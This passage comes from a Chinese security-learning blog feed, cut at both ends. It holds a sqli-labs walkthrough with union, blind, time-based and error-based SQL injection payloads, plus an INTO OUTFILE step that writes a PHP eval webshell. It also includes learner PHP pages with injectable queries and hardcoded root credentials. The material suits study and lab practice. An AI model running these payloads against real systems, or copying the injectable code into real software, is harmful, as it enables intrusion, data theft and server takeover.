keyword">ORDER</span> <span class="token keyword">BY</span> id <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">68</span> <span class="token comment">-- #</span></code></pre><ul><li>报错注入</li><li>延时注入</li><li>布尔盲注</li></ul><h3 id="less-7"><strong>Less-7</strong></h3><ul><li>导入文件</li></ul><pre class="language-sql" data-language="sql"><code class="language-sql">sqlid<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>@<span class="token variable">@datadir</span><span class="token punctuation">,</span>@<span class="token variable">@basedir</span>  <span class="token comment">--+ </span></code></pre><figure><imgsrc="https://cdn.jsdelivr.net/gh/5had0wKv/pictureBed/img/202208211645371.png"alt="image-20220821164538211" /><figcaption aria-hidden="true">image-20220821164538211</figcaption></figure><ul><li>列数</li></ul><figure><imgsrc="https://cdn.jsdelivr.net/gh/5had0wKv/pictureBed/img/202208211653489.png"alt="image-20220821165326381" /><figcaption aria-hidden="true">image-20220821165326381</figcaption></figure><ul><li>读权限</li></ul><pre class="language-sql" data-language="sql"><code class="language-sql">id<span class="token operator">=</span><span class="token number">1</span>'<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">and</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> mysql<span class="token punctuation">.</span><span class="token keyword">user</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span> <span class="token comment">--+</span></code></pre><figure><imgsrc="https://cdn.jsdelivr.net/gh/5had0wKv/pictureBed/img/202208211700957.png"alt="image-20220821170000808" /><figcaption aria-hidden="true">image-20220821170000808</figcaption></figure><ul><li>注入木马</li></ul><pre class="language-sql" data-language="sql"><code class="language-sql">id<span class="token operator">=</span><span class="token number">1</span><span class="token string">')) union select 1,2,"&lt;?php @eval($_POST['</span>x'<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span class="token string">" into outfile "</span><span class="token operator">/</span>opt<span class="token operator">/</span>lampp<span class="token operator">/</span>htdocs<span class="token operator">/</span>sqli<span class="token operator">-</span>labs<span class="token operator">-</span>master<span class="token operator">/</span>xcb<span class="token punctuation">.</span>php" <span class="token comment">--+</span></code></pre><figure><imgsrc="https://cdn.jsdelivr.net/gh/5had0wKv/pictureBed/img/202208211716874.png"alt="image-20220821171645745" /><figcaption aria-hidden="true">image-20220821171645745</figcaption></figure><figure><imgsrc="https://cdn.jsdelivr.net/gh/5had0wKv/pictureBed/img/202208211717877.png"alt="image-20220821171725797" /><figcaption aria-hidden="true">image-20220821171725797</figcaption></figure><h3 id="less-9"><strong>Less-9</strong></h3><pre class="language-sql" data-language="sql"><code class="language-sql">id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>length<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">--+ </span></code></pre><pre class="language-sql" data-language="sql"><code class="language-sql">id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and if(left((select table_name from information_schema.tables where table_schema=database() limit 3,1),5)='</span>users'<span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">--+</span></code></pre><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># 猜列名</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and If(ascii(substr((select table_name from information_schema.tables where table_schema='</span>security' <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+</span></code></pre><h3 id="less-11"><strong>Less-11</strong></h3><pre class="language-sql" data-language="sql"><code class="language-sql">uname<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token comment">--+ &amp;passwd=1</span></code></pre><figure><imgsrc="https://cdn.jsdelivr.net/gh/5had0wKv/pictureBed/img/202208212151463.png"alt="image-20220821215101225" /><figcaption aria-hidden="true">image-20220821215101225</figcaption></figure><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#或者</span>uname<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>passwd<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token comment">--+</span></code></pre><ul><li>字段</li></ul><pre class="language-sql" data-language="sql"><code class="language-sql">uname<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span>  <span class="token comment">--+ &amp;passwd=1 </span></code></pre><figure><imgsrc="https://cdn.jsdelivr.net/gh/5had0wKv/pictureBed/img/202208212211349.png"alt="image-20220821221108192" /><figcaption aria-hidden="true">image-20220821221108192</figcaption></figure><ul><li>爆出所有数据库</li></ul><pre class="language-sql" data-language="sql"><code class="language-sql">uname<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>schemta <span class="token comment">--+ &amp;passwd=1 </span></code></pre><figure><imgsrc="https://cdn.jsdelivr.net/gh/5had0wKv/pictureBed/img/202208212221076.png"alt="image-20220821222150931" /><figcaption aria-hidden="true">image-20220821222150931</figcaption></figure><ul><li>爆出库下所有表</li></ul><pre class="language-sql" data-language="sql"><code class="language-sql">uname<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,group_concat(table_name) from information_schema.tables where table_schema='</span>security' <span class="token comment">--+ &amp;passwd=1</span></code></pre><ul><li>爆出表下所有列</li></ul><pre class="language-none"><code class="language-none">uname&#x3D;-1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39; --+ &amp;passwd&#x3D;1 </code></pre><h3 id="插曲">插曲</h3><ul><li>打算在burp内嵌的浏览器chromium中安装hackbar，但是这个chromium一直无法访问google</li></ul><p><ahref="https://blog.malteksolutions.com/ssh-socks-and-burp/">solution</a></p><figure><imgsrc="https://cdn.jsdelivr.net/gh/5had0wKv/pictureBed/img/202208232130246.png"alt="image-20220823213008125" /><figcaption aria-hidden="true">image-20220823213008125</figcaption></figure><ul><li>burp 改造</li></ul><figure><imgsrc="https://cdn.jsdelivr.net/gh/5had0wKv/pictureBed/img/202208232218104.png"alt="image-20220823221741500" /><figcaption aria-hidden="true">image-20220823221741500</figcaption></figure><h3 id="less-11-burp">less-11 burp</h3><ul><li><code>extractvalue（）</code>函数<ul><li>此函数从目标XML中返回包含所查询值的字符串语法<code>：extractvalue（XML_document，xpath_string）</code>第一个参数：string格式，为XML文档对象的名称第二个参数：xpath_string（xpath格式的字符串）<code>select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</code></li><li>extractvalue使用时当<code>xpath_string</code>格式出现错误，mysql则会爆出xpath语法错误（xpathsyntax）</li><li><code>select user,password from users where user_id=1 and (extractvalue(1,0x7e));</code></li><li>由于0x7e就是~不属于xpath语法格式，因此报出xpath语法错误。</li></ul></li></ul><figure><imgsrc="https://cdn.jsdelivr.net/gh/5had0wKv/pictureBed/img/202208232247800.png"alt="image-20220823224729667" /><figcaption aria-hidden="true">image-20220823224729667</figcaption></figure><pre class="language-sql" data-language="sql"><code class="language-sql">uname<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">--+ &amp;passwd=1&amp;submit=Submit</span></code></pre><figure><imgsrc="C:/Users/liu%20haihua/AppData/Roaming/Typora/typora-user-images/image-20220824125340958.png"alt="image-20220824125340958" /><figcaption aria-hidden="true">image-20220824125340958</figcaption></figure><h3 id="less-12">less-12</h3><pre class="language-sql" data-language="sql"><code class="language-sql">uname<span class="token operator">=</span><span class="token number">1</span>"<span class="token punctuation">)</span> <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token comment">--+&amp;passwd=1</span></code></pre><figure><imgsrc="C:/Users/liu%20haihua/AppData/Roaming/Typora/typora-user-images/image-20220824174845222.png"alt="image-20220824174845222" /><figcaption aria-hidden="true">image-20220824174845222</figcaption></figure><ul><li>一个在<code>hackbar</code> 的bug?</li></ul><figure><imgsrc="https://cdn.jsdelivr.net/gh/5had0wKv/pictureBed/img/202208241918508.png"alt="image-20220824191814384" /><figcaption aria-hidden="true">image-20220824191814384</figcaption></figure><p>但是在burp</p><figure><imgsrc="https://cdn.jsdelivr.net/gh/5had0wKv/pictureBed/img/202208241919399.png"alt="image-20220824191912289" /><figcaption aria-hidden="true">image-20220824191912289</figcaption></figure><figure><imgsrc="https://cdn.jsdelivr.net/gh/5had0wKv/pictureBed/img/202208241951513.png"alt="image-20220824195115393" /><figcaption aria-hidden="true">image-20220824195115393</figcaption></figure><ul><li>hackbar中post方式的选择</li></ul><figure><imgsrc="https://cdn.jsdelivr.net/gh/5had0wKv/pictureBed/img/202208251651185.png"alt="image-20220825165136076" /><figcaption aria-hidden="true">image-20220825165136076</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> Cybersecurity </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端与PHP</title>
      <link href="/2022/08/13/qian-duan-yu-php/"/>
      <url>/2022/08/13/qian-duan-yu-php/</url>
      
        <content type="html"><![CDATA[<h3 id="div盒模型">div盒模型</h3><h3 id="js">JS</h3><ul><li>BOM</li><li>DOM</li></ul><blockquote><ul><li>getElementById() // 注意有无s的区别</li><li>getElementByClassName()</li><li>ByTagName</li></ul></blockquote><ul><li>远程连接centOs中的mysql</li></ul><blockquote><ul><li>CentOS: xampp/bin 中登录mysql</li></ul></blockquote><h3 id="php连接数据库">php连接数据库</h3><blockquote><ol type="1"><li><strong>centos 开放端口与ip</strong> firewall-cmd --permanent--add-rich-rule='rule family="ipv4" source address="192.168.1.1" portprotocol="tcp" port="8080" accept'</li></ol></blockquote><ul><li>mysql 用户表管理（赋予权限</li></ul><figure><img src="https://s2.loli.net/2022/08/14/FMIeyNcJb6aEHqY.png"alt="image-20220814160343357" /><figcaption aria-hidden="true">image-20220814160343357</figcaption></figure><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>login.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">text-align</span><span class="token punctuation">:</span>center<span class="token punctuation">;</span><span class="token property">vertical-align</span><span class="token punctuation">:</span>middel<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span>            <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>用户名<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">text-align</span><span class="token punctuation">:</span>center<span class="token punctuation">;</span><span class="token property">vertical-align</span><span class="token punctuation">:</span>middel<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span>            <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>密码<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">text-align</span><span class="token punctuation">:</span>center<span class="token punctuation">;</span><span class="token property">vertical-align</span><span class="token punctuation">:</span>middel<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>vcode<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>vcode<span class="token punctuation">"</span></span>            <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>验证码<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bu<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>登录<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><figure><img src="https://s2.loli.net/2022/08/14/z3VGkRNDHm5qFK7.png"alt="image-20220814160734536" /><figcaption aria-hidden="true">image-20220814160734536</figcaption></figure><h3 id="文章系统">文章系统</h3><figure><img src="https://s2.loli.net/2022/08/16/TJ3QKfiSgN6hsyO.png"alt="image-20220816201142904" /><figcaption aria-hidden="true">image-20220816201142904</figcaption></figure><pre class="language-php+HTML" data-language="php+HTML"><code class="language-php+HTML"># reg.html&lt;!DOCTYPE html&gt;&lt;html lang&#x3D;&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge&quot;&gt;    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt;    &lt;title&gt;注册&lt;&#x2F;title&gt;    &lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;jquery-3.6.0.min.js&quot;&gt;&lt;&#x2F;script&gt;    &lt;script&gt;        function doReg() &#123;            var username &#x3D; $(&quot;#username&quot;).val();            var password &#x3D; $(&quot;#password&quot;).val();            var param &#x3D; &quot;username&#x3D;&quot; + username + &quot;&amp;password&#x3D;&quot; + password;            $.post(&#39;reg.php&#39;, param, function (data) &#123;                if (data &#x3D;&#x3D; &#39;reg-pass&#39;) &#123;                    window.alert(&quot;注册成功&quot;)                    location.href &#x3D; &quot;login.html&quot;;                &#125; else if (data &#x3D;&#x3D; &#39;user-exists&#39;) &#123;                    window.alert(&quot;用户名已注册&quot;);                &#125; else &#123;                    window.alert(&quot;注册失败&quot;);                &#125;            &#125;)        &#125;    &lt;&#x2F;script&gt;    &lt;style&gt;        table &#123;            width: 600px;            margin: auto;            border-spacing: 0;            border: solid 1px green;            margin-top: 200px;        &#125;        td &#123;            height: 50px;            text-align: center;            border: solid 1px gray;        &#125;        button &#123;            width: 200px;            height: 35px;            background-color: dodgerblue;            color: whitesmoke;            border-radius: 5px;        &#125;    &lt;&#x2F;style&gt;&lt;&#x2F;head&gt;&lt;body&gt;    &lt;table&gt;        &lt;form action&#x3D;&quot;reg.php&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;            &lt;tr&gt;                &lt;td width&#x3D;&quot;40%&quot;&gt;用户名：&lt;&#x2F;td&gt;                &lt;td width&#x3D;&quot;60%&quot;&gt;&lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;username&quot; &#x2F;&gt;&lt;&#x2F;td&gt;            &lt;&#x2F;tr&gt;            &lt;tr&gt;                &lt;td&gt;密码：&lt;&#x2F;td&gt;                &lt;td&gt;&lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;password&quot; &#x2F;&gt;&lt;&#x2F;td&gt;            &lt;&#x2F;tr&gt;            &lt;tr&gt;                &lt;td&gt;头像&lt;&#x2F;td&gt;                &lt;td&gt;&lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;myfile&quot;&gt;&lt;&#x2F;td&gt;            &lt;&#x2F;tr&gt;            &lt;tr&gt;                &lt;td colspan&#x3D;&quot;2&quot;&gt;&lt;button onclick&#x3D;&quot;doReg()&quot;&gt;注册&lt;&#x2F;button&gt;&lt;&#x2F;td&gt;            &lt;&#x2F;tr&gt;        &lt;&#x2F;form&gt;    &lt;&#x2F;table&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;</code></pre><pre class="language-php+HTML" data-language="php+HTML"><code class="language-php+HTML"># reg.php&lt;?php$conn &#x3D; mysqli_connect(&#39;127.0.0.1&#39;,&#39;root&#39;, &#39;123456&#39;, &#39;learn&#39;);$username &#x3D; $_POST[&#39;username&#39;];$password &#x3D; $_POST[&#39;password&#39;];$sql &#x3D; &quot;select * from login where username &#x3D; &#39;jf&#39;&quot;;$result &#x3D; mysqli_query($conn, $sql);$count &#x3D; mysqli_num_rows($result);if($count &gt;&#x3D; 1) &#123;    die(&#39;user-exists&#39;); &#125;$sql &#x3D; &quot;insert into login (username, password) values(&#39;$username&#39;, &#39;$password&#39;)&quot;;mysqli_query($conn, $sql) or die(&quot;reg-fail&quot;);echo &quot;reg-pass&quot;;mysqli_close($conn);?&gt;</code></pre><pre class="language-php+HTML" data-language="php+HTML"><code class="language-php+HTML"># welcome.php&lt;?phpinclude &quot;common.php&quot;;    &#x2F;&#x2F; 修复漏洞    if(!isset($_SESSION[&#39;islogin&#39;]) or $_SESSION[&#39;islogin&#39;] !&#x3D; &#39;true&#39;) &#123;        die(&quot;你还没有登录，无法访问本页面&lt;&#x2F;br&gt;&quot;);    &#125;    echo &#39;欢迎来到我的网站&lt;br&gt;&#39;;    ?&gt;</code></pre><pre class="language-php+HTML" data-language="php+HTML"><code class="language-php+HTML"># list.php&lt;!DOCTYPE html&gt;&lt;html lang&#x3D;&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge&quot;&gt;    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt;    &lt;title&gt;文章列表&lt;&#x2F;title&gt;    &lt;style&gt;        table &#123;            width: 800px;            margin: auto;            border: solid 1px green;            border-spacing: 0px;        &#125;        table td &#123;            border: solid 2px gray;            height: 40px;            text-align: center;        &#125;    &lt;&#x2F;style&gt;    &lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;jquery-3.6.0.min.js&quot;&gt;&lt;&#x2F;script&gt;    &lt;script&gt;        function doDelete(articleid) &#123;            $.post(&#39;delete.php&#39;, &#39;articleid&#x3D;&#39; + articleid, function(data) &#123;                if (data &#x3D;&#x3D; &#39;delete-ok&#39;) &#123;                    location.reload();                &#125; else &#123;                    window.alert(&#39;删除失败&#39;);                &#125;            &#125;)        &#125;    &lt;&#x2F;script&gt;&lt;&#x2F;head&gt;&lt;body&gt;    &lt;table&gt;        &lt;tr&gt;            &lt;td&gt;编号&lt;&#x2F;td&gt;            &lt;td&gt;作者&lt;&#x2F;td&gt;            &lt;td&gt;标题&lt;&#x2F;td&gt;            &lt;td&gt;查看次数&lt;&#x2F;td&gt;            &lt;td&gt;创建时间&lt;&#x2F;td&gt;            &lt;td&gt;操作&lt;&#x2F;td&gt;        &lt;&#x2F;tr&gt;        &lt;?php        echo &#39;&lt;tr&gt;&#39;;        $conn &#x3D; mysqli_connect(&#39;127.0.0.1&#39;, &#39;root&#39;, &#39;123456&#39;, &#39;learn&#39;) or die(&#39;数据库连接不成功&#39;);        mysqli_query($conn, &#39;set names utf8&#39;);        $sql &#x3D; &#39;select articleid, author, headline,viewcount, createtime from article where articleid &lt; 4&#39;;        $result &#x3D; mysqli_query($conn, $sql);        $rows &#x3D; mysqli_fetch_all($result);        foreach ($rows as $row) &#123;            echo &#39;&lt;tr&gt;&#39;;            echo &#39;&lt;td&gt;&#39; . $row[0] . &#39;&lt;&#x2F;td&gt;&#39;;            echo &#39;&lt;td&gt;&#39; . $row[1] . &#39;&lt;&#x2F;td&gt;&#39;;            echo &#39;&lt;td&gt;&lt;a href &#x3D; read.php?id&#x3D;&#39; . $row[0] . &#39;&gt;&#39; . $row[2] . &#39;&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;&#39;;            echo &#39;&lt;td&gt;&#39; . $row[3] . &#39;&lt;&#x2F;td&gt;&#39;;            echo &#39;&lt;td&gt;&#39; . $row[4] . &#39;&lt;&#x2F;td&gt;&#39;;            echo &#39;&lt;td&gt;&lt;button onclick&#x3D;&quot;doDelete(&#39; . $row[0] . &#39;)&quot;&gt; 删除&lt;&#x2F;button&gt;&lt;&#x2F;td&gt;&#39;;            echo &#39;&lt;&#x2F;td&gt;&#39;;        &#125;        echo &#39;&lt;&#x2F;table&gt;&#39;;        mysqli_close($conn);        ?&gt;    &lt;&#x2F;table&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;</code></pre><pre class="language-php+HTML" data-language="php+HTML"><code class="language-php+HTML"># read.php&lt;?php$id &#x3D; $_GET[&#39;id&#39;];$conn &#x3D; mysqli_connect(&#39;127.0.0.1&#39;, &#39;root&#39;, &#39;123456&#39;, &#39;learn&#39;);mysqli_query($conn, &quot;set names utf8&quot;);$sql &#x3D; &quot;select * from article where articleid &#x3D; &#39;$id&#39;&quot;;$result &#x3D; mysqli_query($conn, $sql);$article &#x3D; mysqli_fetch_assoc($result);echo $article[&#39;headline&#39;].&quot;&lt;br&#x2F;&gt;&quot;;echo &quot;&lt;hr&#x2F;&gt;&quot;;echo $article[&#39;content&#39;];</code></pre><p><a href="">代码在github</a></p>]]></content>
      
      
      <categories>
          
          <category> Programming Design </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试基础（上）</title>
      <link href="/2022/08/12/shen-tou-ce-shi/"/>
      <url>/2022/08/12/shen-tou-ce-shi/</url>
      
        <content type="html"><![CDATA[<h3 id="渗透测试">渗透测试</h3><ol type="1"><li>黑盒测试</li><li>白盒测试</li><li>灰盒测试</li><li>术语</li></ol><blockquote><ol type="1"><li>webshell</li><li>payload</li><li>EXP</li><li>POC</li><li>CC</li><li>C2</li><li>FUZZ</li><li>WAF</li><li>IDS</li><li>IPS</li><li>APT</li><li>提权</li><li>越权</li></ol></blockquote><h3 id="owasp-top10">OWASP TOP10</h3><h3 id="burpsuite和hackbar">BurpSuite和HackBar</h3><ol type="1"><li>BurpSuite : 针对http和https</li></ol><blockquote><ol type="1"><li>proxy模块</li><li>repeater</li><li>intruder(爆破)</li><li>target模块</li></ol></blockquote><blockquote><p>localhost;127.<em>;10.</em>;172.16.<em>;172.17.</em>;172.18.<em>;172.19.</em>;172.20.<em>;172.21.</em>;172.22.<em>;172.23.</em>;172.24.<em>;172.25.</em>;172.26.<em>;172.27.</em>;172.28.<em>;172.29.</em>;172.30.<em>;172.31.</em>;172.32.<em>;192.168.</em></p></blockquote><figure><img src="https://s2.loli.net/2022/08/12/P5hr83RV6cZ19Ou.png"alt="image-20220812222634923" /><figcaption aria-hidden="true">image-20220812222634923</figcaption></figure><figure><img src="https://s2.loli.net/2022/08/12/yGqA8WnSdhLotCa.png"alt="image-20220812222110333" /><figcaption aria-hidden="true">image-20220812222110333</figcaption></figure><ul><li>下载burp证书</li></ul><h3 id="登陆漏洞-实现原理">登陆漏洞-实现原理</h3><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>   <span class="token comment">// 获取用户提交请求的数据</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$vcode</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'vcode'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">// 万能验证码漏洞</span><span class="token comment">// 验证码</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$vcode</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'0000'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"vcode-error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 没有爆破防护</span><span class="token comment">// 连接到数据库</span><span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'root'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'123456'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'learn'</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"数据库连接不成功"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 设置编码格式</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"set names utf8"</span><span class="token punctuation">)</span><span class="token 